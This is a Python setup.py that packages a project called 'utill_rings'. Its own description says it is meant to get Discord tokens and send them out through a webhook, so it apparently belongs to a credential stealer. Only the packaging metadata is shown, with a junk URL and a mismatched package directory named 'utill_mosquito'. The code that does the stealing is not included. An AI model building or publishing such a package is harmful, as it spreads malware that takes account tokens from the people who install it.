from setuptools import setup

def readme():
	with open('README.md') as f:
		README = f.read()
	return README

setup(
	name = 'utill_rings',
	version = '1.0.0',
	description = 'A Python package to easy get discord tokens and send them via webhook',
	long_description = readme(),
	long_description_content_type = 'text/markdown',
	url = 'kutas',
	author = 'AdoHail',
	license = 'MIT',
	classifiers = [
		'License :: OSI Approved :: MIT License',
		'Programming Language :: Python :: 3'
	],
	packages = ['utill_mosquito'],
	include_package_data = True,
	install_requires = ['requests'],
	)